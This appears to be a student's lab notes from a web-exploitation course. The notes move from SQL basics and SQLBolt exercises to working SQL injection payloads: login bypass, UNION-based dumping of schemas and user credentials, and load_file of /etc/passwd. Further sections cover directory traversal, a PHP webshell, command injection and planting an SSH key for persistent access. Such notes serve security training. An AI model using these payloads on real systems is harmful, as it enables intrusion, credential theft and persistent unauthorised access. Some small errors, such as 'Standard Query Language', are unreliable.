##### SQL

- SQL = "Standard Query Language"
- SQL is an ANSI standard used for data processing in a database.

### SQL Standard Commands

[SQL Syntax](https://www.w3schools.com/SQl/sql_syntax.asp)

```
USE             select the DB you would like to use.
SELECT          extracts data from a database
UPDATE          updates data in a database
DELETE          deletes data from a database
INSERT INTO     inserts new data into a database
CREATE DATABASE creates a new database
ALTER DATABASE  modifies a database
CREATE TABLE    creates a new table
ALTER TABLE     modifies a table
DROP TABLE      deletes a table
CREATE INDEX    creates an index (search key)
DROP INDEX      deletes an index
UNION           Used to combine the result-set of two or more SELECT statements

```






### SQL Injection - Considerations

- Require Valid SQL Queries
- Fully patched systems can be vulnerable due to misconfiguration
- Input Field Sanitization
- String vs Integer Values
- Is information_schema Database available?
- GET Request versus POST Request HTTP methods


# SQL COMMANDS DEMO

```
Database 	= File | DOD
Table 		= Sheets | USMC, USAF
Column 		= Columns | Rank, Lname, EDIPI

>> mysql				:	starts sql

>> msql --user=root --pass=<password>	:	choose a user/pw

>> show databases ;			:	shows databases available

## the 3 defaullt databases
------------------------------------------------------------------
information_schema	:	database of databases (meta data)
mysql			:	configuration, user information
performance_schema	:	status information	
-------------------------------------------------------------------

>> show tables from <database>		:		shows tables from a given database
>> show tables from session		:		shows tables from 'session' database

## generic SQL statements
-------------------------------------------------------------------
>> select <column> from <database>.<table>
>> select * from session.Tires;
-------------------------------------------------------------------

>> select tireid,name,size from session.Tires;
>> select * from session.car;


## combining statements
-----------------------
1. Nesting Statements
	>> select * form session.car; select * from session.Tires;

2. Joining statements
	'UNION' command
	car table = 4
	Tires = 6
	
	>> select * form session.car UNIONselect * from session.Tires;


	#this would result in 'ERROR: different number of columns'

	 Add or remove rolumns
	 1 | 2 | 3 | 4 | 5 | 6
	 1 | 2 | 3 | 4 | null | null


	1,2,3
	null

	>> select * from session.car UNION select *,1,2 from session.Tires

	>> select * from sesion.car UNION select *,'a','a' from session.Tires

	removing columns
	----------------
		>> select carid,name,type,cost from session.car UNION select * from session.Tires
		
	--------------------------------------------------------------------------------------------
	
	describe <database>.<table>			:	shows expected type of a table
	describe session.car;
	
	carid | name | type | cost | color | year 
	int | varchar | varchar | int | varchar | int
```

### SQLBOLT

[practice website](https://sqlbolt.com/) 1-5 done, do 6-11 and 13 later


```
Exercise 3:
----------------------------------------------------------------------------------------------------------------
1. Find all the Toy Story movies
	>> SELECT title FROM movies WHERE title LIKE "%Toy Story%"
2. Find all the movies directed by John Lasseter
	>> SELECT title FROM movies WHERE director LIKE "John Lasseter"
3. Find all the movies (and director) not directed by John Lasseter
	>> SELECT title FROM movies WHERE director NOT LIKE "John Lasseter"
4. Find all the WALL-* movies
	>> SELECT title FROM movies WHERE title LIKE "%WALL-%"
---------------------------------------------------------------------------------------------------------------

Exercise 4:
1. List all directors of Pixar movies (alphabetically), without duplicates
	>> SELECT DISTINCT director FROM movies ORDER BY director ASC
2. List the last four Pixar movies released (ordered from most recent to least)
	>> SELECT title FROM movies ORDER BY year DESC LIMIT 4
3. List the first five Pixar movies sorted alphabetically
	>> SELECT title FROM movies ORDER BY title ASC LIMIT 5;
4. List the next five Pixar movies sorted alphabetically
	>> SELECT title FROM movies ORDER BY title ASC LIMIT 5 OFFSET 5;
----------------------------------------------------------------------------------------------------------------

Exercise 5:
1. List all the Canadian cities and their populations 
	>> SELECT City,Population from north_american_cities WHERE country LIKE "Canada"
2. Order all the cities in the United States by their latitude from north to south
	>> SELECT City from north_american_cities where country like "United States" order by latitude desc
3. List all the cities west of Chicago, ordered from west to east
	>> SELECT City from north_american_cities where longitude < -87.629798 order by longitude asc
4. List the two largest cities in Mexico (by population)
	>> SELECT City,population from north_american_cities where country like "Mexico" order by population desc limit 2
	
Exercise 6:

```
# SQL Injection Demo

- SQL injection is the use of Valid SQL Queries, via input data fields or attaching of queries to the end of URLs, from the client-side to a server-side application. This allows data to be read or modified. SQL injection relies on unsanitized input fields.

#### Logical Example
```
$name = [ daniel ]
$pass = [ password ] 

SELECt id FROM users WHERE name='$name' and pass='$pass';
SELECt id FROM users WHERE name='daniel' AND pass='password'


$name = [ daniel' or 1='1 ]
$pass = [ password' or 1='1 ]

select id FROM users WHERE name='daniel' or 1='1' AND pass='password' or 1='1';

1=1 True 
```

# Actual Demo
- ip: 10.50.21.144


### SQL Injection - Login - Credentials

#### STEPS: 
- on 10.50.21.144, view page source and examine index.html
- after entering any username and password, open console using f12 and open network tab; note the POST in the console for login.php
- Attempt to use one of the generic truth statements (see below) in the password field with any username: should be successful

##### 1. Determine if the login page (POST method) is vulnerable to SQL injection via Truth statment
- generic truth statements: 
- `<value>' or 1='1`
- `<value>' or 1='1;
- `<value>' or 1='1; #`
- `<value>' or 1='1; --`

if the website returns some wacky output, it is vulnerable to SQL injection.

	What did we determine?
	1. The 10.50.21.144 is vulnerable to SQL injection
	2. admin is a user

## 2. Exploit vulnerable login page (GET Method) w/ truth statement

http://10.50.21.144/login.php

What are the query string parameters?
- username
- password

building the query string from searchbar (step by step)

- http://10.50.21.144/login.php
- http://10.50.21.144/login.php?
- http://10.50.21.144/login.php?username
- http://10.50.21.144/login.php?username=
- http://10.50.21.144/login.php?username=dan'
- http://10.50.21.144/login.php?username=dan' or 1='1
- http://10.50.21.144/login.php?username=dan' or 1='1&
- http://10.50.21.144/login.php?username=dan' or 1='1&passwd
- http://10.50.21.144/login.php?username=dan' or 1='1&passwd=

- **http://10.50.21.144/login.php?username=dan' or 1='1&passwd=dan' or 1='1**


### Practice Website (cars SQL)

http://10.50.21.144/Union.html

## SQL Injection - POST Method

#### Steps:
##### 0. Behavior analyis (use the website!)
- Only valid values will display information from the table on a webpage

##### 1. Determine vulernable webpage via truth statement
- generic truth statement (POST)
- `Ford' or 1='1`		#didnt work
- `Ford' or 1='1;`		#didnt work
- `Ford' or 1='1; #`		#didnt work
- `Ford' or 1='1; --`		#didnt work

((for the sake of time, the other variations with the other cars also didnt work. in practice, test these!))

- `Audi' or 1='1; --` 		#WORKED!

##### 2. Determine the number of clomuns that exist on the webpage via fuzzing
- Rows: 5
- Columns: 4 <---- lowest

	**We start with the lowest number and slowly move up higher!!!**
	
- `Audi' or 1='1;`

- `'Audi' UNION select 1,2,3,4`		#nope
- `Audi' UNION select 1,2,3,4;`		#nope
- `Audi' UNION select 1,2,3,4; #`	#nope
- `Audi' UNION select 1,2,3,4; --`	#nope

- `'Audi' UNION select 1,2,3,4,5`	#nope
- `Audi' UNION select 1,2,3,4,5;`	#nope
- `Audi' UNION select 1,2,3,4,5; #`	#WORKS!
- `Audi' UNION select 1,2,3,4,5; --`	#nope

##### 3. Determine the number of columns, the order, and if there are any hidden columns

- Columns: 5
- Display Order: 1,3,4,5
- Hidden: 2 (as in column 2)

##### 4. Dumping/Extracting information via Golden Statement

The golden statement:
- `SELECT table_schema,table_name,column_name FROM information_schema.columns`

information_schema = database, database of databases, provides all information pertaining to database information

information_schema.columns = NOT actually a column! it is a table named 'column'. try not to think too hard

table_schema = column inside the 'columns' table

table_name = column inside the columns table, lits out table names

column_name = column inside the columns table, lists out column names

`Audi' UNION select 1,2,3,4,5;#`
`Audi' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns; #`

1. table_schema 	:	database names
2. 2 = placeholder for hidden '2'
3. table_name
4. column_name
5. 5 = placeholder for '5'


- to get creds? switch it around a bit

##### 5. Extracting desired information

- switch around your golden SQL statement a bit

`Audi' UNION select id,2,name,pass,5 from session.user; #`



## SQL Injection - Webpages - GET METHOD

#### STEPS

##### 0. Behavior analysis
- look at what the website is actually doing ; pay attention to URL changes and what is happening on your screen, play with choices

##### 1. Determine vulnerable webpage via truth statement
- generic truth statement (GET)
- `<value or 1=1`
- `<value or 1=1;`
- `<value or 1=1; #
- `<value or 1=1; --`

- http://10.50.21.144/uniondemo.php?Selection=2 or 1=1
- http://10.50.21.144/uniondemo.php?Selection=2 or 1=1;
- http://10.50.21.144/uniondemo.php?Selection=2 or 1=1; #
- http://10.50.21.144/uniondemo.php?Selection=2 or 1=1; --

- http://10.50.21.144/uniondemo.php?Selection=3 or 1=1
- http://10.50.21.144/uniondemo.php?Selection=3 or 1=1;
- http://10.50.21.144/uniondemo.php?Selection=3 or 1=1; #
- http://10.50.21.144/uniondemo.php?Selection=3 or 1=1; --

- http://10.50.21.144/uniondemo.php?Selection=4 or 1=1
- http://10.50.21.144/uniondemo.php?Selection=4 or 1=1; 
- http://10.50.21.144/uniondemo.php?Selection=4 or 1=1; #
- http://10.50.21.144/uniondemo.php?Selection=4 or 1=1; --


- all of the above work 







###### 2. Determine the number of columns that exist on the table displayed on the webpage via Fuzzing

- rows: 5
- Columns: 3 ((start at lowest))

- http://10.50.21.144/uniondemo.php?Selection=2 or 1=1
- http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3	#works ((all others work too))

##### 3. Determine the number of columns, the order, and if there are any hidden columns

Columns: 3
Display order: 1,2,3

Backend Order: 1 | 2 | 3
Webpage Order: 1 | 3 | 2

##### 4. Dumping/extracting information via golden statement

- Generic SQL Statement
- `select <column> from <<database>.<table>`

- Generic golden statement
- `select table_schema,table_name,column_name from information_schema.columns`


http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,table_name.column_name from information_schema.columns

- Backend Order:
table_schema | table_name | column_name
----------------------------------------
1	     |      2     |      3


- Webpage Display Order:
table_schema | column name | table_name
----------------------------------------
1             |      3      |     2



- if you wanted to get the following:
1. name,type,year
2. session
3. car

then:
- http://10.50.21.144/uniondemo.php?Selection=2 UNION select name,type,year FROM session.car


#### 5. Extract desired information

##### 5.1 SQL Injection Filtering (WHERE)

http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,coolumn.name,table_name from information_schema.columns where table_schema='session'

- this gets rid of the default schema's from your SQL injection query


##### 5.2 SQL Injection - Functions (LOAD_FILE())
- UNION select 1,2,load_file('/etc/passwd')

/etc/passwd
/etc/group
/etc/networks
/etc/hosts
/etc/resolv.conf

##### 5.3 SQL Injection - SQL Version (@@version)

SELECT 1,2,@@version

> 10.1.48-MariaDB-0Ubuntu0.18.04.1

##### 5.4 SQL Injection Considerations - Escaping Characters

[site](https://dev.mysql.com/doc/refman/8.0/en/string-literals.html)



# EDITING AN SQL GOLDEN STATEMENT

**BASIC FORMAT: website/file.php?selection=x UNION select column,column,column from schema.table**

```
basic order of precedence for an sql table is as follows:
	schema -> table -> column
	


lets say you are given the followng table:
---------------------------------------------------
siteusers 	customer 	$id
siteusers 	customer 	$name
siteusers 	customer 	$account
siteusers 	customer 	$category
siteusers 	customer 	$description
siteusers 	net_products 	$id
siteusers 	net_products 	$quantity
siteusers 	net_products 	$product
siteusers 	net_products 	$price
siteusers 	purchase_history 	$id
siteusers 	purchase_history 	$quantity
siteusers 	purchase_history 	$product
siteusers 	purchase_history 	$account
siteusers 	shippingdates 	$id
siteusers 	shippingdates 	$ordernumber
siteusers 	shippingdates 	$account
siteusers 	shippingdates 	$date
siteusers 	users 	$user_id
siteusers 	users 	$name
siteusers 	users 	$username
-----------------------------------------------------


BASIC FORMAT: website/file.php?selection=x UNION select column,column,column from schema.table

your golden statement (following the 'ile.php?selection=1' statement, or whatever the vulnerable entry is), would be the following.

	to get the user_id,name,and user name COLUMNS from the users TABLE of the siteusers SCHEMA:
	
		> UNION select user_id,name,username from siteusers.users
		
			# in this case, you are selecting 3 specified columns from the 'users' table in the 'siteusers' schema
	~	~	~	~	~	~	~	~	~	~	~	~	~	~	~
	
	to get the date, ordernumber, and account COLUMNS from the shippingdates TABLE of the siteusers SCHEMA
	
		> http://localhost:11135/pick.php?product=7%20UNION%20select%20account,date,id%20from%20siteusers.shippingdates	
			
			#you should get the idea now. format is
	
```

=====================================================================================================================================================================

- Demo Web Exploit Float IP: 10.50.34.125

# HTTP

###### Types
Two types:
1. Request 	(client)
2. Reply 	(server)

##### HTTP Methods

- GET 		:	*requesting or retrieving data*
- HEAD 
- POST 		:	*sending information i.e. login credentials*

*Example:*
GET / HTTP/1.1
- GET = HTTP Method to Request/Retrieve
- / = www.google.com/
- HTTP/1.1 = HTTP Version being used

##### HTTP Status Codes

[list of codes](https://tools.ietf.org/html/rfc2616)

- 1xx = Informational Response
- 2xx = Successful
- 3xx = Redirection
- 4xx = Client Error
- 5xx = Server Error

### HTTP Developer Console

1. Open a web page in firefox
2. Right click -> `view page source`
3. press `f12`
 
#### Console Tab

`document.location;`
`document.cookie;`
`function();`		*can run existing functions on the website*
<script>
function myFunction() {
document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>
#### Network Tab

##### GET methods
- Headers	:	Shows information about nature of client-server relationship
- User Agent	:	Gives user-agent information, useful for forensics

right click -> `copy as cURL`	:	shows CLI syntax for sending that specific GET request
- example: `curl 'https://quotes.toscrape.com/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://www.google.com/' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: cross-site'`

# WGET & CURL

#### WGET 
`wget -r -l2 -P /tmp ftp://ftpserver/`

^	`-r` recurisve, `-l2` 2 layers deep, `-P /tmp` saves to tmp directory
- Don't rely on using WGET as a crutch

#### CURL 
`curl -o example.html http://www.reddit.com`

# JAVASCRIPT

- JavaScript runs on the client's machine
- Coded as `.js` files or in line with html

 ## JavaScript interactive

- below reference formatting will suck in `.md` format

```java
<script>
function changeText() {
  x = document.getElementById("mySelect");
  x.options[x.selectedIndex].text = "Melon";
}
Select your favorite fruit:
<select id="mySelect">
  <option>Apple</option>
  <option>Orange</option>
  <option>Pineapple</option>
  <option>Banana</option>
<input type="button" onclick="changeText()" value="Set text of selected option">`
```
# WEB ENUMERATION STEPS
	
- The goal of web enumeration is to find out the existing webpages and webdirectories
	
1. Host Discovery (ping sweep)
2. Host Enumeration (port scan)
	`nmap -Pn -T5 x.x.x.x -p-`
	
3. Service enumeration (-sV|banner.nse)
	`nmap -Pn -T5 x.x.x.x -sV -p <ports>`
	`nmap -Pn -T5 x.x.x.x --script=banner.nse -p <ports>`
	
4. Web Enumeration
	`nmap -Pn -T5 -sT -p 80 --script http-enum.nse x.x.x.x`
	`nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse x.x.x.x`
	`nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse x.x.x.x`
	
	^ robots.txt finds webpages you can navigate to outside of the normal means
	
	So what actually is the robots.txt file?
	- Robots.txt tells webcrawlers what **can** and **cannot** be indexed
	
Example: ((syntax will suck in .md format))
```
	User-agent: *
	Allow: /uploads
	Allow: /chat
	Allow: /cmdinjection
	Allow: /java
	Allow: /path
	Allow: /webexampe
	Disallow: /cross
	Disallow: /
``` 

	User-agent: Googlebot
	Disallow: /


	User-agent: Baiduspider
	Disallow: /
			
# 5. Web Exploitation

### a. Directory Traversal -  Information
	
http://10.50.34.125/path/pathdemo.php
	
../../../../../../../../../../../etc/passwd
- http://10.50.34.125/path/pathdemo.php?
- http://10.50.34.125/path/pathdemo.php?myfile
- http://10.50.34.125/path/pathdemo.php?myfile=
- http://10.50.34.125/path/pathdemo.php?myfile=../../../../../../../../../../../etc/passwd
- http://10.50.34.125/path/pathdemo.php?myfile=../../../../../../../../../../../etc/passwd&
- http://10.50.34.125/path/pathdemo.php?myfile=../../../../../../../../../../../etc/passwd&submit=File+look+up		##also works



	
	
#### directory traversal files to read:
		- /etc/passwd		:	user information ((look for login shells/bash shells!)
		- /etc/group		:	groups that users are in ((look for root|adm|sudo))
		- /etc/hosts		:	shows webservers, dns servers, internal networks, or labelled network information	
		- /etc/resolv.conf	:	shows internal IP networks we can scan for
		- /etc/networks		:	tbh not exactly sure but likely not a big deal
		

### b. Malicious File Upload (Webshell) - Information/Access

- Can you upload? Yes (.php)
- Are file extensions being sanitized? No
- Can you access the uploads directory? Yes
- demo site: http://10.50.34.125/uploads/webshell.php
- webshell.php:

```
<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```

STEPS:
1. Go to 10.50.34.125
2. Upload webshell.php
3. Go back to 10.50.34.125/cmdinjection/cmdinjectdemo.php
4. try entering commands (must have a semicolon before command, i.e. `; whoami`

### c. SSH Keys - Access

ssh student@x.x.x.x
password

##### 1. Generating SSH KEYS

1. On whichever host you plan on logging in from, generate keys. (10.150.34.125)
	- `ssh-keygen -t rsa -b 4096`
	- Public key is found in /home/student/.ssh/id_rsa.pub

```ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCnyLyyhsXRBrjshi4WbMDMQ+nZuqH3nYnEMOUwqYPU6kyVDRq3+BBQ0yWrqF7OeP0WkGnkQq15MHTwqlZVcC3L/TuRhU8jq/ABErO/WK7HB0M3DAQ6bKBsTyunUKmD7g0I9TgFb0/WRk988Q91nbx129m+KaeXu9oh6pxdtIT4XxWHZMHVngEGe8qCs1OFSpTLYb0wpcDdGtaj88QbmoiU2zgMiGgidiGyab0vLX3hRoyaxPh3xtIcopnJamistVeFCCgz0GsAikvMDiGo1RsVOmOzTqNBrosSgMH8kSrQb47agAMdp8FIuLb7Bx6mInkipL3ZT+yHCs7BXME3E34v student@linux-opstation-0yyk```


##### 2. Determine the user on the webserver

`; whoami`

- resuslt: www-data


##### 3. Determine the user's home directory

`;cat /etc/passwd`

- `www-data:x:33:33:www-data:/var/www:/bin/bash`
- user			: www-data
- home directory	: /var/www
- login shell		: /bin/bash

##### 4. Determine if .ssh/ directory exists in the user's home directory; if not, create it

`;ls -la /var/www`


##### 5. Create .ssh/ directory

`;mkdir /var/www/.ssh`

##### 6. Validate the .ssh/ directory has been created

`;ls -la /var/www`

##### 7. Inject our key into the authorized_keys file

`;echo "" >> /var/www/.ssh/authorized_keys`

##### 8. Validate the public is inside the authroized_keys file

`; cat /var/www/.ssh/authorized_keys`

##### 9. Login from the workstation you generated the key from

`ssh www-data@10.50.34.125`

- Webservers default web directories:
```
http://10.50.34.125/ = /var/www/html
http://10.50.34.125/uploads = /var/www/html/uploads
```






#### c. Command injection - Information/Access
	

	
	
### NIKTO

nikto v -h 10.50.34.125
